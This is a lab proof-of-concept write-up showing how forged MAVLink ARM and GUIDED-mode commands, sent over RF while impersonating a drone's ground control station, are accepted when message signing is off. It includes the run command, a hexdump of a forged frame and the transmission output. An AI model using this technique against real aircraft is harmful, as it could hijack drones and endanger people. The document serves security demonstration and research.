# PoC 03 — Command Injection (over-the-air)

**PWNUAV stages:** C2-01 (GCS spoofing) · C2-02 (sync) · EX-01 (mode) · EX-02 (arm/disarm)
**Mode:** RF / over-the-air · **venv:** `.venv-radio`

## What it demonstrates
The link does not authenticate the sender. The attacker impersonates the GCS (sysid 255) and transmits a command sequence: **ARM** and a **switch to GUIDED mode**. A drone without MAVLink signing would execute them.

## How it works
1. Two forged COMMAND_LONG messages are built (ARM_DISARM param1=1, DO_SET_MODE GUIDED) with a spoofed GCS identity.
2. The hexdump of the ARM frame is shown (MAVLink 2, `0xFD`, src=`FF`=255, msgid=`4C`=76 COMMAND_LONG).
3. They are modulated and transmitted by the **Pluto**; a confirmation **RTL-SDR** decodes the air.
4. It counts the valid frames of each command recovered → proof that they travel and are acceptable.

> The emulated drone does not receive RF in this lab; the PoC proves that the forged command travels and is valid over the air — a real autopilot without auth would execute it.

## Command (input)
```
$ python attacks/03-cmd-injection/inject_aire.py
```

## Real output
```
========== PWNUAV COMMAND INJECTION — GCS impersonation ==========
[C2-01] Impersonating ground control station  sysid=255 compid=190
[C2-02] Target vehicle sysid=1 ; MAVLink2 signing OFF -> sender not verified

[*] Injection set:
   1) COMMAND_LONG MAV_CMD_COMPONENT_ARM_DISARM  (ARM)
   2) COMMAND_LONG MAV_CMD_DO_SET_MODE  (SET_GUIDED)

[*] Frame #1 (ARM) — raw MAVLink 2 on the air:
  0000  FD 20 00 00 00 FF BE 4C 00 00 00 00 80 3F 00 00   . .....L.....?..
  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
  0020  00 00 00 00 00 00 90 01 01 01 9E 4E               ...........N

[EX] Transmitting injection burst on 915 MHz (Pluto) ...

[*] Confirmed on the air (2,066,080 IQ samples, 27 COMMAND_LONG decoded):
   ARM        ->  13 valid frames  target=1  src=255  param1=1        OK
   SET_GUIDED ->  14 valid frames  base_mode=CUSTOM  custom_mode=4   OK

[+] INJECTION LANDED — unauthenticated commands accepted on the link (EX-01/EX-02).
```

## Interpretation
- **Frame #1 hexdump:** a real COMMAND_LONG from `sysid=255` (spoofed GCS) toward `sysid=1`.
- **Confirmed on the air:** ARM and SET_GUIDED decoded as valid. Without MAVLink signing the origin is not verified (C2-01), and the commands are accepted (EX-01/EX-02).

## Safety
Transmits commands over RF: ONLY in a cage. Never aim it at real aircraft.
